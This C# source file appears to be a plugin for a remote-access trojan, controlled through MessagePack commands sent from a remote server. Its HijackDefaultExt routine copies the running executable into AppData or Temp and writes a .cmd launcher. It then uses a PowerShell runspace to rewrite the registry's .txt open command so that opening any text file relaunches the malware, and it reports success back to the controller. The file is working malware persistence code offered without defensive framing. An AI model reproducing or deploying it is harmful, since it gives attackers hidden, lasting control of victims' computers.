using MessagePackLib.MessagePack;
using System;
using System.Text;
using System.Threading;
using System.Management.Automation.Runspaces;
using System.Security.Principal;
using System.Diagnostics;
using System.IO;

namespace Plugin
{
    public static class Packet
    {
        public static void Read(object data)
        {
            try
            {
                MsgPack unpack_msgpack = new MsgPack();
                unpack_msgpack.DecodeFromBytes((byte[])data);
                switch (unpack_msgpack.ForcePathObject("Pac_ket").AsString)
                {
                    case "hijackdefaultext":
                        {
                            HijackDefaultExt();
                            Connection.Disconnected();
                            break;
                        }
                }
            }
            catch (Exception ex)
            {
                Error(ex.Message);
            }
        }
        public static bool IsHighIntegrity()
        {
            // returns true if the current process is running with adminstrative privs in a high integrity context
            WindowsIdentity identity = WindowsIdentity.GetCurrent();
            WindowsPrincipal principal = new WindowsPrincipal(identity);
            return principal.IsInRole(WindowsBuiltInRole.Administrator);
        }

        public static void PSLoader(string cmd)
        {
            Runspace rs = RunspaceFactory.CreateRunspace();
            rs.Open();
            Pipeline pipeline = rs.CreatePipeline();
            pipeline.Commands.AddScript(cmd);
            pipeline.Invoke();
            rs.Close();
        }

        public static void HijackDefaultExt()
        {
            if (!IsHighIntegrity())
            {
                Log(Connection.Hwid + ":[-] Not in high integrity!");
                return;
            }
            string name = Process.GetCurrentProcess().ProcessName + ".exe";
            string bat = Process.GetCurrentProcess().ProcessName + ".cmd";

            string filepath;
            string batpath;
            try
            {
                filepath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), name);
                batpath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), bat);
                File.Copy(Process.GetCurrentProcess().MainModule.FileName, filepath, true);
            }
            catch
            {
                filepath = Path.Combine(Path.GetTempPath(), name);
                batpath = Path.Combine(Path.GetTempPath(), bat);
                File.Copy(Process.GetCurrentProcess().MainModule.FileName, filepath, true);
            }

            string[] commands = new string[] { "start " + filepath, "start notepad.exe %1" };
            using (StreamWriter sw = new StreamWriter(batpath))
            {
                foreach (string s in commands)
                {
                    sw.WriteLine(s);
                }
            }

            string cmd = "reg add \"HKEY_CLASSES_ROOT\\txtfile\\shell\\open\\command\" /ve /d " + batpath + " /f /t reg_expand_sz";
            try
            {
                PSLoader(cmd);
                Log(Connection.Hwid + ":[+] Hijack Default TXT Success!");
            }
            catch(Exception ex)
            {
                Error(ex.Message);
            }
        }

        public static void Error(string ex)
        {
            MsgPack msgpack = new MsgPack();
            msgpack.ForcePathObject("Pac_ket").AsString = "Error";
            msgpack.ForcePathObject("Error").AsString = ex;
            Connection.Send(msgpack.Encode2Bytes());
        }
        public static void Log(string message)
        {
            MsgPack msgpack = new MsgPack();
            msgpack.ForcePathObject("Pac_ket").AsString = "Logs";
            msgpack.ForcePathObject("Message").AsString = message;
            Connection.Send(msgpack.Encode2Bytes());
        }
    }

}